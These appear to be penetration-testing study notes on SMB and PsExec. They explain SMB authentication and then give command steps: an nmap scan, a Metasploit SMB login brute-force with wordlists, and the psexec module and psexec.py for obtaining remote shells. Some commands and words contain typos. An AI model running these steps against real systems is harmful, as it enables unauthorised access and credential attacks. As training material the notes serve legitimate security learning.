- SMB (Server Message Block) is a ***network file sharing protocol*** that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).
- SMB uses port 445 (TCP). However, originally, ***SMB ran on top of NetBIOS using port 139***.
- **SAMBA** is the open source Linux implementation of SMB, and ***allows Windows systems to access Linux shares and devices.***

### SMB Authentication
The SMB protocol utilizes two levels of authentication:
- User Authentication
- Share Authentication

**User Authentication**: Users must ***provide a username and password*** in order to authenticate with the SMB server in order to access a share.

**Share Authentication**: Users must ***provide a password*** in order to access restricted share.

Note: Both of these authentication levels utilize a ***challenge response authentication system***.

### PsExec
- PsExec is a lightweight talent-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user's credentials.
- PsExec authentication is performed via SMB.
- We can use the PsExec utility to authenticate with the target system legitimately and run commands or launch a remote command prompt.
- It is similarly to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.

### SMB Exploitation with PsExec
- In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes.
- This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attack.
- We can narrow down our brute-force attack to only include common windows user accounts like: Administrator.
- After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.

***
***
## Practical
#### Scan the Target
```
namp target
```

#### Find Supported Protocols and Dialects 
Once the port is discovered, run nmap script to list the supported protocols and dialects of a SMB server.
```
nmap -p445 --script smb-protocols target
```

#### Find all valid Users and their Passwords using Metasploit
```
search smb_login
use auxiliary/scanner/smb/smb_login
options
set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set verbose false
run
```

Once the valid users and their passwords are found.
#### Run PsExec Module to gain the Meterpreter Shell
```
search psexec
use explioit/windows/smb/psexec
set rhosts target
set smbuser username
set smbpass password
# set lhost and lport if not already
run
```

### Using PsExec Python Tool
To run the cmd prompt
```
psexec.py username@IP cmd.exe
```